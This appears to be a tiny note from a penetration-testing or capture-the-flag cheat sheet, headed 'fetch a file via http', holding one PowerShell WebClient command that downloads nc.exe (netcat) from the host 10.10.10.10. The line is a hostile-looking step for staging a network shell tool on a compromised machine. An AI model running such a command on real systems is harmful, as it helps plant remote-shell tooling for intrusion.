fetch a file via http
(New-Object System.Net.WebClient).DownloadFile(“http://10.10.10.10/nc.exe”, “nc.exe”)
